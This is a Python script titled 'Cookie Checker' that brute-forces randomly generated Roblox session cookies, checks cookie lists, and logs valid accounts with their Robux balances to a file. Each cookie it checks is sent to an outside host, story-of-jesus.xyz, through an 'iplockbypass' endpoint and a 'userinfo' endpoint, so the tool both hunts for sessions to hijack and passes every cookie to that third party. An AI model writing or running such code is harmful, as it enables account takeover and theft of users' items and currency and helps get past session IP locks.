import requests, json, re
import random, string
import os
import threading
import multiprocessing


def menu():
    print("""
    Cookie Checker
    
    [1] auto gen and check cookies
    [2] check cookies using a list
    [3] get info on a single cookie
    
    """)

    choice = input("- ")

    if choice == '1':

        os.system('cls')
        t1 = threading.Thread(target=process1)
        t2 = threading.Thread(target=process1)
        t3 = threading.Thread(target=process1)
        t4 = threading.Thread(target=process1)
        t5 = threading.Thread(target=process1)

        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()

    elif choice == '2':
        os.system('cls')
        process2()

    elif choice == '3':
        os.system('cls')
        process3()


def process1():
    while True:

        valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
        rancookie = ''.join((random.choice(valid_letters) for i in range(776)))
        finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie

        cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={finalcookie}").text

        r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
        data = r.json()

        if data["error"] == "Invalid-Cookie":

            falsecookie = rancookie[:29]
            print("[INVALID] " + falsecookie + "...")

        elif data["status"] == "good":

            falsecookie = rancookie[:9]
            robuxamount = str(data['robux'])
            print(f"[VALID]" + falsecookie + f"... USERNAME: '{data['username']}' Robux: '{robuxamount}' Logged To File.")
            f = open("cookies.txt", "a")
            f.write(str(rancookie + " Robux: " + robuxamount + "\n"))
            f.close()

        else:
            exit()

def process2():
    with open('list.txt') as lines:
        for line in lines:
            cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={line}").text

            r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
            data = r.json()

            if data["error"] == "Invalid-Cookie":

                falsecookie = line[:29]
                print("[INVALID] " + falsecookie)

            elif data["status"] == "good":

                falsecookie = line[:9]
                robuxamount = str(data['robux'])
                print(
                    f"[VALID]" + falsecookie + f"... USERNAME: '{data['username']}' Robux: '{robuxamount}' Logged To File.")
                f = open("cookies.txt", "a")
                f.write(str(line + " Robux: " + robuxamount + "\n"))
                f.close()

            else:
                exit()

def process3():
    print("Enter a Cookie: ")
    cookie = input()

    cooki = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={cookie}").text

    r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cooki}')
    data = r.json()

    print(data)

    process3()

menu()
